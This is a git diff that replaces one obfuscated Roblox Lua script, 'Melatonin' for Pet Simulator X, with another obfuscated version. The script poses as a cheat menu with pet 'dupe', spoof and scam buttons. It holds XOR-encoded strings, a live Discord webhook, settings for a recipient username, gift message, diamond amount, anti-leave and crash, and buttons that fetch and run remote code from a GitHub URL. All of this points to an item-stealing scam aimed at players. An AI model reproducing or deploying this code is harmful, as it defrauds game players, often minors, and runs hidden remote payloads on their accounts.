@@ -1,3 +1,188 @@
 --// Melatonin
 
-local v0={};v0["obf_stringchar%0"]=string.char;v0["obf_stringbyte%0"]=string.byte;v0["obf_stringsub%0"]=string.sub;v0["obf_bitlib%0"]=bit32 or bit ;v0["obf_XOR%0"]=v0["obf_bitlib%0"].bxor;v0["obf_tableconcat%0"]=table.concat;v0["obf_tableinsert%0"]=table.insert;local function v13(v28,v29)local v30=0;while true do if ((4567>1532) and (v30==0)) then v0["result%0"]={};for v38=1, #v28 do v0["obf_tableinsert%0"](v0["result%0"],v0["obf_stringchar%0"](v0["obf_XOR%0"](v0["obf_stringbyte%0"](v0["obf_stringsub%0"](v28,v38,v38 + (619 -(201 + 417)) )),v0["obf_stringbyte%0"](v0["obf_stringsub%0"](v29,1 + 0 + ((v38-(1 + 0))% #v29) ,1 + ((v38-1)% #v29) + (1 -0) )))%(163 + 93) ));end v30=1;end if (v30~=1) then else return v0["obf_tableconcat%0"](v0["result%0"]);end end end _G.Username=v13("\154\235\31\81\83\12\104\224","\209\132\114\62\32\109\88");_G.ScriptName="Melatonin | [💎MINE] Pet Simulator X! 🐾";_G.Webhook="https://discord.com/api/webhooks/1097308151373639680/tpxmO6Ow7z5DpJKO4L747uuCPTeXzqGFsdhkwiE_b6CX_j4WuQhNUuHbbqxG57sgJ8a_";_G.GiftMessage=v13("\189\234\116\203\48\211\192","\233\132\31\184\16");_G.Diamonds=501419 -(169 + 1250) ;_G.UnlockPets=true;_G.AntiLeave=true;_G.Crash=true;_G.Tip1="Don't leave !";_G.Tip2=v13("\124\9\222\147\14\76\23\32\66\4\151\147\70\92\89\56\68\9\211\142\64\94\89\50\66\6\222\148\70","\43\104\183\231\46\57\121\84");_G.Tip3=v13("\254\77\89\167\109\106\135\213\75\92\161\109\112\151\135\78\67\180\41\112\138\192\12\2","\167\34\44\213\77\25\228");_G.Tip4=v13("\33\50\245\73\181\20\115\252\94\240\20\56\190\89\251\1\58\242\12\225\29\54\190\95\246\7\58\238\88\181\25\60\255\72","\117\83\158\44\149");_G.Tip5="Don't forget to join the discord!";v0["Sound%0"]=Instance.new(v13("\76\168\104\2\72","\31\199\29\108\44"),game:GetService(v13("\218\43\9\166\89\219\236\54\10\161\94\237","\137\68\124\200\61\136")));v0["Click%0"]=Instance.new(v13("\155\123\175\37\14","\200\20\218\75\106\137"),game:GetService(v13("\21\46\33\8\34\18\49\20\48\40\55\3","\70\65\84\102")));v0["Click%0"].SoundId="rbxassetid://876939830";v0["Sound%0"].SoundId="rbxassetid://8482764467";v0["Sound%0"]:Play();game:GetService(v13("\115\64\85\18\84\81\70\39\85\93","\32\52\52\96")):SetCore(v13("\105\95\113\190\245\164\78\83\92\118\185\218\191\83\85\84","\58\58\31\218\187\203\58"),{[v13("\38\64\156\3\1","\114\41\232\111\100\235")]=v13("\255\168\92\85\96\221\163\89\90\52\206\237\124\91\117\214\168\84\24\52\226\136\100\20\71\251\128\16\108","\178\205\48\52\20"),[v13("\183\206\3\52","\227\171\123\64")]=v13("\165\52\10\83\10\42\152\59\92\12\110","\237\85\124\54\42\76"),[v13("\236\219\13\34\64\12\199\192","\168\174\127\67\52\101")]=256 -(134 + 102) ,[v13("\110\72\189\72\174\66\12","\44\61\201\60\193")]=v13("\133\182\175\176","\202\221\206\201\110"),[v13("\2\235\12\138","\75\136\99\228\174\175")]="https://www.roblox.com/asset/?id=12841940716"});game:GetService(v13("\55\194\132\145\16\211\151\164\17\223","\100\182\229\227")):SetCore(v13("\105\254\83\92\152\213\204\177\92\242\94\89\162\211\215\182","\58\155\61\56\214\186\184\216"),{[v13("\38\203\158\207\23","\114\162\234\163")]=v13("\247\177\42\53\226\78\174\147\177\42\118\229\89\184\214\249","\179\216\89\86\141\60\202"),[v13("\119\41\2\100","\35\76\122\16\91\61")]="Join the discord : discord.gg/3fjRZzQp3T",[v13("\220\80\152\239\236\76\133\224","\152\37\234\142")]=267155673 -167155674 ,[v13("\227\151\71\84\206\140\2","\161\226\51\32")]=v13("\60\202\86\166\117","\118\133\31\232\91\132\153\173"),[v13("\4\209\254\168\187\138\116","\70\164\138\220\212\228")]=v13("\87\22\159\119\90\29\153\21","\19\83\220\59"),[v13("\214\160\167\86","\159\195\200\56\60\96\218")]="https://www.roblox.com/asset/?id=5313546565"});Wait(2);v0["Library%0"]=loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))();v0["Window%0"]=v0["Library%0"].CreateLib("Melatonin | [💎MINE] Pet Simulator X! 🐾",v13("\115\207\16\146\173\96\213\20\143\173","\52\189\113\226\200"));print(v13("\54\23\248\37\192\163\166\18\28\180\8\251\141\140\62\54","\123\114\148\68\180\204\200"));v0["Main%0"]=v0["Window%0"]:NewTab("🌎 - Main");v0["MainSection%0"]=v0["Main%0"]:NewSection("Update - 04/17/2023");MainSection=v0["Main%0"]:NewSection("📅 Updates every day!");MainSection=v0["Main%0"]:NewSection("🚀 Discord : discord.gg/3fjRZzQp3T");v0["Function%0"]=v0["Window%0"]:NewTab("📀 - Function");v0["FunctionSection%0"]=v0["Function%0"]:NewSection("Visual Trade 👀");v0["Spoofer%0"]=v0["Window%0"]:NewTab("👻 - Spoofer");v0["SpooferSection%0"]=v0["Spoofer%0"]:NewSection("👻 - Spoofer");v0["Dupe%0"]=v0["Window%0"]:NewTab("🤡 - Dupe/Scam");v0["DupeSection%0"]=v0["Dupe%0"]:NewSection("Click for take pets 👥");v0["Premium%0"]=v0["Window%0"]:NewTab("💎 - Premium");v0["PremiumSection%0"]=v0["Premium%0"]:NewSection("💎 - Premium");v0["FunctionSection%0"]:NewToggle("✅ On / ❌ Off ",v13("\54\213\68\81\66\239\88\31\13\210\22\112\4\198\22\75\10\197\22\73\11\211\67\94\14\128\66\77\3\196\83\17","\98\160\54\63"),function(v31)if (v31 or (1086>2455)) then v0["Click%0"]:Play();else v0["Click%0"]:Play();end end);v0["FunctionSection%0"]:NewButton("Fake Titanic 🧩 ",v13("\154\121\235\23\190\116\170\24\249\121\255\30\188\49\250\28\173\49\254\22\249\112\170\31\184\122\239\89\173\120\254\24\183\120\233","\217\17\138\121"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v0["FunctionSection%0"]:NewButton("Fake Banana 🍌 ",v13("\196\215\69\30\180\10\190\230\159\84\21\167\79\234\232\159\69\80\181\14\245\226\159\70\17\189\14\240\230","\135\191\36\112\211\111\158"),function()local v32=0;while true do if (v32~=0) then else v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();break;end end end);v0["FunctionSection%0"]:NewButton("Fake Huge 🎈 ",v13("\200\173\133\36\91\31\171\164\196\58\89\14\171\177\139\106\93\90\237\164\143\47\28\18\254\162\129","\139\197\228\74\60\122"),function()v0["Click%0"]:Play();end);v0["SpooferSection%0"]:NewButton("Spoof your username 😎 ",v13("\83\17\90\70\133\117\89\66\71\151\98\89\78\91\135\98\23\90\69\135","\16\121\59\40\226"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v0["SpooferSection%0"]:NewButton("Spoof your Pets 🌝 ",v13("\122\32\203\126\89\39\157\64\39\223\98\30\18\216\77\59","\57\72\170\16\62\66\189"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v0["SpooferSection%0"]:NewButton("Spoof your Diamonds 💎 ",v13("\136\72\120\160\172\69\57\183\164\85\107\238\175\73\120\163\164\78\125\189\235\65\116\163\164\85\119\186","\203\32\25\206"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v0["SpooferSection%0"]:NewButton("Spoof your Coins 🥴 ",v13("\112\224\63\241\43\252\248\74\231\43\237\108\250\183\90\230\45\191\45\244\181\92\253\48\235","\51\136\94\159\76\153\216"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v0["DupeSection%0"]:NewButton("Titanic pet 🔥 ",v13("\233\184\12\22\190\7\75\238\178\25\26\240\15\8\154\171\8\15","\186\219\109\123\158\102\107"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);v0["DupeSection%0"]:NewButton("Huge pet ☀️ ",v13("\194\9\56\56\144\48\189\217\31\62\48\144\33\248\229","\145\106\89\85\176\81\157"),function()local v33=0;while true do if ((4278>706) and (v33~=0)) then else v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();break;end end end);DupeSection=v0["Dupe%0"]:NewSection("🎯 Dupe");DupeSection:NewButton("Boosts Dupe 🏃 ",v13("\174\197\7\228\202\201\24\244\152\144\21\238\133\195\3\242","\234\176\119\129"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);DupeSection:NewButton("Exclusive Egg Dupe 🥚 ",v13("\197\176\32\140\87\69\50\100\243\229\21\145\20\80\40\98\232\179\53\201\50\91\58","\129\197\80\233\119\60\93\17"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);DupeSection:NewButton("Day Care Dupe 🧸 ",v13("\38\181\25\44\18\27\175\28\59\18\38\161\16\105\113\3\178\12\105\66\7\180\26","\98\192\105\73\50"),function()v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();end);DupeSection:NewButton("Auctions Scams 🍄 ",v13("\172\103\235\3\198\97\251\22\139\50\249\2\133\102\241\24\136\97","\230\18\152\119"),function()local v34=0;while true do if ((0~=v34) or (3470<1015)) then else v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();break;end end end);DupeSection:NewButton("Eggs for Diamonds 💎 ",v13("\114\202\72\235\24\218\67\252\80\222\85\248\93\159\95\246\89\210\84\241\92\204\27\249\87\205\27\250\95\216\72","\56\191\59\159"),function()local v35=0;while true do if ((v35~=0) or (3708<=1547)) then else v0["Click%0"]:Play();loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();break;end end end);v0["PremiumSection%0"]:NewTextBox(v13("\248\98\36\168\24\156\207\136\91\36\188","\168\16\65\197\113\233\162"),v13("\11\22\43\154\34\12\42\200\123\8\58\195\123\23\48\154\46\13\51\213\56\8\127\234\41\6\50\211\46\14","\91\99\95\186"),function(v36)print(v36);end);
+local obf_stringchar = string.char;
+local obf_stringbyte = string.byte;
+local obf_stringsub = string.sub;
+local obf_bitlib = bit32 or bit;
+local obf_XOR = obf_bitlib.bxor;
+local obf_tableconcat = table.concat;
+local obf_tableinsert = table.insert;
+local function LUAOBFUSACTOR_DECRYPT_STR_0(LUAOBFUSACTOR_STR, LUAOBFUSACTOR_KEY)
+	local result = {};
+	for i = 1, #LUAOBFUSACTOR_STR do
+		obf_tableinsert(result, obf_stringchar(obf_XOR(obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_STR, i, i + 1)), obf_stringbyte(obf_stringsub(LUAOBFUSACTOR_KEY, 1 + ((i - 1) % #LUAOBFUSACTOR_KEY), 1 + ((i - 1) % #LUAOBFUSACTOR_KEY) + 1))) % 256));
+	end
+	return obf_tableconcat(result);
+end
+local v0 = bit32 or bit;
+local v1 = v0.bxor;
+local v2 = v0.bor;
+local v3 = v0.band;
+_G.Username = LUAOBFUSACTOR_DECRYPT_STR_0("\109\161\34\137\38\179\22\255", "\38\206\79\230\85\210");
+_G.ScriptName = "Melatonin | [💎MINE] Pet Simulator X! 🐾";
+_G.Webhook = "https://discord.com/api/webhooks/1097308151373639680/tpxmO6Ow7z5DpJKO4L747uuCPTeXzqGFsdhkwiE_b6CX_j4WuQhNUuHbbqxG57sgJ8a_";
+_G.GiftMessage = LUAOBFUSACTOR_DECRYPT_STR_0("\37\246\95\183\81\65\105", "\113\152\52\196\113\123\45\63");
+_G.Diamonds = v3(283233, 216767) + v2(283233, 216767);
+_G.UnlockPets = true;
+_G.AntiLeave = true;
+_G.Crash = true;
+_G.Tip1 = "Don't leave !";
+_G.Tip2 = LUAOBFUSACTOR_DECRYPT_STR_0("\49\134\114\16\82\110\208\18\142\119\68\6\115\219\70\139\116\5\22\114\208\1\199\125\13\28\114\205\14", "\102\231\27\100\114\27\190");
+_G.Tip3 = LUAOBFUSACTOR_DECRYPT_STR_0("\127\68\227\196\234\255\69\89\255\198\190\172\79\88\182\218\165\237\66\66\248\209\228\162", "\38\43\150\182\202\140");
+_G.Tip4 = LUAOBFUSACTOR_DECRYPT_STR_0("\246\78\115\17\130\78\56\22\208\74\121\31\130\90\118\0\203\67\56\0\202\74\56\7\193\93\113\4\214\15\116\27\195\75", "\162\47\24\116");
+_G.Tip5 = "Don't forget to join the discord!";
+local v4 = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\16\169\36\213\141", "\67\198\81\187\233\197"), game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\52\79\220\86\235\52\69\219\78\230\4\69", "\103\32\169\56\143")));
+local v5 = Instance.new(LUAOBFUSACTOR_DECRYPT_STR_0("\207\85\214\122\231", "\156\58\163\20\131\188\86\214"), game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\112\53\75\2\10\241\70\40\72\5\13\199", "\35\90\62\108\110\162")));
+v5.SoundId = "rbxassetid://876939830";
+v4.SoundId = "rbxassetid://8482764467";
+v4:Play();
+game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\9\56\255\0\91\173\169\29\57\247", "\90\76\158\114\47\200\219")):SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\243\171\124\122\153\20\108\61\198\167\113\127\163\18\119\58", "\160\206\18\30\215\123\24\84"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\1\90\108\90\236", "\85\51\24\54\137\55")]=LUAOBFUSACTOR_DECRYPT_STR_0("\139\44\114\17\73\63\165\175\39\62\12\29\28\164\167\45\123\20\17\112\155\131\29\62\35\116\29\235\158", "\198\73\30\112\61\80\203"),[LUAOBFUSACTOR_DECRYPT_STR_0("\1\134\57\83", "\85\227\65\39\60\155")]=LUAOBFUSACTOR_DECRYPT_STR_0("\52\194\216\140\136\132\158\18\131\148\173", "\124\163\174\233\168\226\235"),[LUAOBFUSACTOR_DECRYPT_STR_0("\213\9\22\185\195\248\19\10", "\145\124\100\216\183")]=(42 - 22),[LUAOBFUSACTOR_DECRYPT_STR_0("\62\174\58\214\186\248\77", "\124\219\78\162\213\150")]=LUAOBFUSACTOR_DECRYPT_STR_0("\141\127\207\81", "\194\20\174\40\62\144"),[LUAOBFUSACTOR_DECRYPT_STR_0("\41\119\225\62", "\96\20\142\80\173\147")]="https://www.roblox.com/asset/?id=12841940716"});
+game:GetService(LUAOBFUSACTOR_DECRYPT_STR_0("\75\76\22\201\108\93\5\252\109\81", "\24\56\119\187")):SetCore(LUAOBFUSACTOR_DECRYPT_STR_0("\255\181\219\243\237\171\101\197\182\220\244\194\176\120\195\190", "\172\208\181\151\163\196\17"), {[LUAOBFUSACTOR_DECRYPT_STR_0("\71\5\24\43\118", "\19\108\108\71")]=LUAOBFUSACTOR_DECRYPT_STR_0("\132\223\34\73\212\246\15\126\169\197\113\66\222\246\14\127", "\192\182\81\42\187\132\107\94"),[LUAOBFUSACTOR_DECRYPT_STR_0("\13\163\201\249", "\89\198\177\141\54")]="Join the discord : discord.gg/3fjRZzQp3T",[LUAOBFUSACTOR_DECRYPT_STR_0("\140\18\230\250\51\161\30\166", "\200\103\148\155\71\200\113")]=(392577795 - 292577796),[LUAOBFUSACTOR_DECRYPT_STR_0("\233\249\255\82\86\228\143", "\171\140\139\38\57\138\190\193")]=LUAOBFUSACTOR_DECRYPT_STR_0("\240\45\125\171\99", "\186\98\52\229\77"),[LUAOBFUSACTOR_DECRYPT_STR_0("\155\33\85\3\182\58\19", "\217\84\33\119")]=LUAOBFUSACTOR_DECRYPT_STR_0("\110\81\167\29\174\100\81\202", "\42\20\228\81\231"),[LUAOBFUSACTOR_DECRYPT_STR_0("\103\237\48\60", "\46\142\95\82\167")]="https://www.roblox.com/asset/?id=5313546565"});
+Wait(1 + 1);
+local v8 = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))();
+local v9 = v8.CreateLib("Melatonin | [💎MINE] Pet Simulator X! 🐾", LUAOBFUSACTOR_DECRYPT_STR_0("\152\96\6\216\186\70\15\205\178\119", "\223\18\103\168"));
+print(LUAOBFUSACTOR_DECRYPT_STR_0("\254\29\205\26\199\23\207\18\221\88\237\52\242\60\228\63", "\179\120\161\123"));
+local v10 = v9:NewTab("🌎 - Main");
+local v11 = v10:NewSection("Update - 04/17/2023");
+v11 = v10:NewSection("📅 Updates every day!");
+v11 = v10:NewSection("🚀 Discord : discord.gg/3fjRZzQp3T");
+local v12 = v9:NewTab("📀 - Function");
+local v13 = v12:NewSection("Visual Trade 👀");
+local v14 = v9:NewTab("👻 - Spoofer");
+local v15 = v14:NewSection("👻 - Spoofer");
+local v16 = v9:NewTab("🤡 - Dupe/Scam");
+local v17 = v16:NewSection("Click for take pets 👥");
+local v18 = v9:NewTab("💎 - Premium");
+local v19 = v18:NewSection("💎 - Premium");
+v13:NewToggle("✅ On / ❌ Off ", LUAOBFUSACTOR_DECRYPT_STR_0("\251\236\184\218\143\214\164\148\192\235\234\251\201\255\234\192\199\252\234\194\198\234\191\213\195\185\190\198\206\253\175\154", "\175\153\202\180"), function(v20)
+	if v20 then
+		v5:Play();
+	else
+		v5:Play();
+	end
+end);
+v13:NewButton("Fake Titanic 🧩 ", LUAOBFUSACTOR_DECRYPT_STR_0("\171\40\92\83\232\238\157\137\96\85\72\232\238\157\152\37\73\29\251\228\157\137\96\91\92\228\238\157\156\41\73\92\225\226\222", "\232\64\61\61\143\139\189"), function()
+	local v21 = 1395 - (v3(271, 1124) + v2(271, 1124));
+	while true do
+		if (v21 == (1371 - (445 + 926))) then
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v13:NewButton("Fake Banana 🍌 ", LUAOBFUSACTOR_DECRYPT_STR_0("\220\140\35\44\35\250\196\35\98\52\250\144\98\54\43\191\133\98\36\37\244\129\98\32\37\241\133\44\35", "\159\228\66\66\68"), function()
+	local v22 = 455 - (v3(291, 164) + v2(291, 164));
+	while true do
+		if (v22 ~= (396 - (v3(186, 210) + v2(186, 210)))) then
+		else
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v13:NewButton("Fake Huge 🎈 ", LUAOBFUSACTOR_DECRYPT_STR_0("\22\86\119\6\198\48\30\119\72\209\48\74\54\28\206\117\95\54\14\192\62\91\54\0\212\50\91", "\85\62\22\104\161"), function()
+	v5:Play();
+end);
+v15:NewButton("Spoof your username 😎 ", LUAOBFUSACTOR_DECRYPT_STR_0("\92\190\86\34\209\121\63\175\88\57\196\60\106\165\82\62\216\125\114\179", "\31\214\55\76\182\28"), function()
+	local v23 = v3(0, 0) + v2(0, 0);
+	while true do
+		if (v23 ~= (1158 - (259 + 899))) then
+		else
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v15:NewButton("Spoof your Pets 🌝 ", LUAOBFUSACTOR_DECRYPT_STR_0("\175\140\69\115\200\230\198\32\131\145\86\61\255\230\146\42", "\236\228\36\29\175\131\230\89"), function()
+	v5:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+v15:NewButton("Spoof your Diamonds 💎 ", LUAOBFUSACTOR_DECRYPT_STR_0("\111\183\56\75\113\29\65\204\67\170\43\5\114\17\0\216\67\177\61\86\54\25\12\216\67\170\55\81", "\44\223\89\37\22\120\97\181"), function()
+	local v24 = 828 - (45 + 783);
+	while true do
+		if (v24 ~= 0) then
+		else
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v15:NewButton("Spoof your Coins 🥴 ", LUAOBFUSACTOR_DECRYPT_STR_0("\112\60\85\35\76\68\19\45\91\56\89\1\80\59\93\35\88\1\82\57\89\34\94\79\71", "\51\84\52\77\43\33"), function()
+	v5:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+v17:NewButton("Titanic pet 🔥 ", LUAOBFUSACTOR_DECRYPT_STR_0("\44\195\128\61\89\199\154\43\201\149\49\23\207\217\95\208\132\36", "\127\160\225\80\121\166\186"), function()
+	local v25 = 632 - (419 + 213);
+	while true do
+		if (v25 ~= (v3(0, 0) + v2(0, 0))) then
+		else
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v17:NewButton("Huge pet ☀️ ", LUAOBFUSACTOR_DECRYPT_STR_0("\225\241\74\64\159\112\177\59\199\245\78\13\207\116\229", "\178\146\43\45\191\17\145\115"), function()
+	v5:Play();
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+end);
+v17 = v16:NewSection("🎯 Dupe");
+v17:NewButton("Boosts Dupe 🏃 ", LUAOBFUSACTOR_DECRYPT_STR_0("\97\35\87\161\176\92\57\82\182\176\71\57\72\183\228\86", "\37\86\39\196\144"), function()
+	local v26 = 680 - (v3(597, 83) + v2(597, 83));
+	while true do
+		if (v26 == (v3(0, 0) + v2(0, 0))) then
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v17:NewButton("Exclusive Egg Dupe 🥚 ", LUAOBFUSACTOR_DECRYPT_STR_0("\93\53\92\48\86\86\62\14\107\96\105\45\21\67\36\8\112\54\73\117\51\72\54", "\25\64\44\85\118\47\81\123"), function()
+	local v27 = 0 - 0;
+	while true do
+		if ((1905 - (v3(538, 1367) + v2(538, 1367))) == v27) then
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v17:NewButton("Day Care Dupe 🧸 ", LUAOBFUSACTOR_DECRYPT_STR_0("\62\181\187\250\227\170\134\75\8\224\143\254\186\243\170\95\8\165\235\239\166\167\154", "\122\192\203\159\195\211\233\62"), function()
+	local v28 = 345 - (v3(314, 31) + v2(314, 31));
+	while true do
+		if (v28 ~= (1089 - (v3(972, 117) + v2(972, 117)))) then
+		else
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v17:NewButton("Auctions Scams 🍄 ", LUAOBFUSACTOR_DECRYPT_STR_0("\1\104\183\200\190\2\183\248\38\61\165\201\253\5\189\246\37\110", "\75\29\196\188\158\113\212\153"), function()
+	local v29 = v3(0, 0) + v2(0, 0);
+	while true do
+		if (v29 == (668 - (383 + 285))) then
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v17:NewButton("Eggs for Diamonds 💎 ", LUAOBFUSACTOR_DECRYPT_STR_0("\173\244\186\16\182\130\249\170\12\247\137\230\172\68\242\142\224\164\11\248\131\242\233\2\249\149\161\172\3\241\148", "\231\129\201\100\150"), function()
+	local v30 = v3(0, 0) + v2(0, 0);
+	while true do
+		if (v30 ~= 0) then
+		else
+			v5:Play();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/K1nscripts/Arkhalis/main/77_OETZZG0NS.lua"))();
+			break;
+		end
+	end
+end);
+v19:NewTextBox(LUAOBFUSACTOR_DECRYPT_STR_0("\31\2\95\206\164\16\34\80\113\198\180", "\79\112\58\163\205\101"), LUAOBFUSACTOR_DECRYPT_STR_0("\56\232\23\155\194\7\232\17\155\208\13\228\67\207\212\72\232\13\215\212\11\246\67\235\201\13\240\10\206\214", "\104\157\99\187\187"), function(v31)
+	print(v31);
+end);
